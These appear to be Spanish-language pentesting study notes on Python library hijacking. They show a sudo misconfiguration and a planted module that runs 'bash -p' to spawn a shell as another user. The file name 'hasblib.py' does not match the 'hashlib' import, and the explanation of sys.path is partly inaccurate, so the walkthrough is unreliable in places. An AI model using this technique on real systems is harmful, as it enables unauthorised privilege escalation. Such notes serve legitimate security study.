# Python Library Hijacking

Tags: #Linux #PythonHijacking  #Escalada #Root #Privilegios

Cuando hablamos de ‘**Python Library Hijacking**‘, a lo que nos referimos es a una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas para inyectar código malicioso en un script. El ataque se produce cuando un atacante crea o modifica una biblioteca en una ruta accesible por el script de Python, de tal manera que cuando el script la importa, se carga la versión maliciosa en lugar de la legítima.

La forma en que el ataque se lleva a cabo es la siguiente: el atacante busca una biblioteca utilizada por el script y la reemplaza por su propia versión maliciosa. Esta biblioteca puede ser una biblioteca estándar de Python o una biblioteca externa descargada e instalada por el usuario. El atacante coloca su versión maliciosa de la biblioteca en una ruta accesible antes de que la biblioteca legítima sea encontrada.

En general, Python comienza buscando estas bibliotecas en el directorio actual de trabajo y luego en las rutas definidas en la variable sys.path. Si el atacante tiene acceso de escritura en alguna de las rutas definidas en sys.path, puede colocar allí su propia versión maliciosa de la biblioteca y hacer que el script la cargue en lugar de la legítima.

Además, el atacante también puede crear su propia biblioteca en el directorio actual de trabajo, ya que Python comienza la búsqueda en este directorio por defecto. Si durante la carga de estas librerías desde el script legítimo, el atacante logra secuestrarlas, entonces conseguirá una ejecución alternativa del programa.


## Python Hijacking

Para este tipo de escalada, podemos encontrar un archivo de la siguiente manera. 

```bash 
❯ sudo -l                                          # Ver que permisos tenemos en el sudoer y poder ejecutar como root algun comando
	
	# (ALL : ALL) ALL
	# (omar) NOPASSWD: /usr/bin/python3 /tmp/example.py
# Podemos ejecutar ese archivo.py python3 como 'omar' y se encuentra en esa ruta 
```

```bash 
❯ sudo -u omar python3 /tmp/example.py           # Forma correcta de ejecutar un archivo cuando es de otro usuario sin proporcionar una passwd
```

Este es el contenido del archivo example.py
```python 
import hashlib

if __name__ == "__main__":
	cadena = "Hola esta es mi cadena"
	print(hashlib.md5(cadena.encode()).hexdigest())
```

Podemos observar el PATH de Python.
```python
❯ python3 -c 'import sys; print(sys.path)'

['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages']
```

* El nivel de prioridad va de izquierda a derecha

Al momento de importar la librería 'hashlib', el sistema lo busca en el PATH de Python y después de encontrarla lo importa. 
* El riesgo de este tipo de ataque viene de la primer cadena vacía **' '** del PATH de Python y hace alusión al directorio actual de trabajo.

Por lo que para poder hacer este tipo de ataque, debemos de crear un archivo que se llame como la librería que se esta importando.
```python
❯ nvim hasblib.py
❯ chmod +x hasblib.py

# Dentro del archivo agregamos lo que queremos que haga

import os 
os.system("bash -p")         # Importaremos la libreria OS, para que a nivel de sistema se encargue de lanzar una consola interactiva bash p = privilege
```

 Después volveremos a ejecutar el example.py y al momento de importar la librería 'hashlib' el sistema lo primero que hará  será buscar en nuestra ruta de trabajo, y es ahí donde nosotros tenemos un archivo llamado hashlib el cual lo ejecutara, lo que ocasionara que al momento de la ejecución este importe la librería OS y nos de una bash interactiva con el nombre del usuario que en este caso es Omar.

* Si logramos alterar la **librería original**, podemos modificarlo para que al inicio de el podamos importar la librería OS y nos pueda dar una consola interactiva. 